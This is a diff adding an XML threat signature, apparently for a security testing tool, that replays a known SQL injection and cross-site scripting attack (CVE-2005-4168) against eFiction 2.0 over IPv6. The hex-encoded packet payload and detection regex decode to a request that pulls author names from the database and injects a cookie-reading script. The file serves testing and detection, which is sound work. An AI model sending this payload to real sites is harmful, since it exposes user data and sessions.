@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="eFiction XSS and SQL Insertion (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a crafted URL that contains Javascript which is included in the returned page, as well as an SQL statement that is executed by the server. eFiction is an web application that typically listens on port 80. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Unauthorized_Use"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="eFiction"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="eFiction_eFiction"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="eFiction_eFiction_2.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://rgod.altervista.org/efiction2_xpl.html"/>
+    <CVEID display="true" value="CVE-2005-4168"/>
+    <bugtraqID display="true" value="15568"/>
+    <OSVDB display="true" value="21120"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="0f441c7b7bb0c2ba287ba82eb6a2a723"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value=""/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236794799"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X50\X4F\X53\X54\X20\X2F\X65\X66\X69\X63\X74\X69\X6F\X6E\X2F\X74\X69\X74\X6C\X65\X73\X2E\X70\X68\X70\X3F\X61\X63\X74\X69\X6F\X6E\X3D\X76\X69\X65\X77\X6C\X69\X73\X74\X26\X6C\X65\X74\X3D\X27\X25\X32\X30\X55\X4E\X49\X4F\X4E\X25\X32\X30\X53\X45\X4C\X45\X43\X54\X25\X32\X30\X30\X2C\X30\X2C\X27\X3C\X73\X63\X72\X69\X70\X74\X3E\X61\X6C\X65\X72\X74\X28\X64\X6F\X63\X75\X6D\X65\X6E\X74\X2E\X63\X6F\X6F\X6B\X69\X65\X29\X3C\X2F\X73\X63\X72\X69\X70\X74\X3E\X27\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X30\X2C\X70\X65\X6E\X6E\X61\X6D\X65\X2C\X30\X25\X32\X30\X46\X52\X4F\X4D\X25\X32\X30\X66\X61\X6E\X66\X69\X63\X74\X69\X6F\X6E\X5F\X61\X75\X74\X68\X6F\X72\X73\X25\X32\X30\X2F\X2A\X20\X48\X54\X54\X50\X2F\X31\X2E\X30\X0D\X0A\X0D\X0A"/>
+    <Created value="1139461981" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="504F5354202F6566696374696F6E2F7469746C65732E7068703F616374696F6E3D766965776C697374266C65743D27253230554E494F4E25323053454C454354253230302C302C273C7363726970743E616C65727428646F63756D656E742E636F6F6B6965293C2F7363726970743E272C302C302C302C302C302C302C302C302C302C302C302C302C302C302C302C302C302C302C70656E6E616D652C3025323046524F4D25323066616E66696374696F6E5F617574686F72732532302F2A20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
